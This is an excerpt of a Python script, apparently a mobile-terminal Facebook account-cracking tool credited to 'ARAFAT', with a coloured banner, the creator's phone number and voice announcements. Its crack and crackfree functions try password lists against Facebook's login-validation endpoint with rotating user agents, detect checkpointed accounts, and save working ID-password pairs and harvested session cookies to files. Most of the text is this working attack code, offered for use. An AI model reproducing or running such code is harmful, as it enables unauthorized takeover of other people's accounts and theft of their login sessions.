...
os.system("xdg-open https://www.facebook.com/profile.php?id=1000785t5010053")
#------------------[ LOGO-LAKNAT ]-----------------#
logo ="""
\033[1;37m┏━━━┳━━━┳━━━┳━━━┳━━━┳━━━━┓
\033[1;37m┃┏━┓┃┏━┓┃┏━┓┃┏━━┫┏━┓┃┏┓┏┓┃
...
\033[1;35m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;35m 
     \033[1;31m✓\033[1;31m [🤍] \033[1;31mCREATOR - \033[1;31mARAFAT\033[1;31m
     \033[92;1m✓\033[92;1m [🤍] \033[92;1mNUMBER  - \033[92;1m01610709657\033[92;1m
...
os.system('espeak -a 300 " Welcome,   to,  Arafat,  Tools"')
pass
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/ARAFAT.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ARAFAT•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[ARAFAT-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[ARAFAT-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[ARAFAT-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ARAFAT-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ARAFAT-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  ARAFAT,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
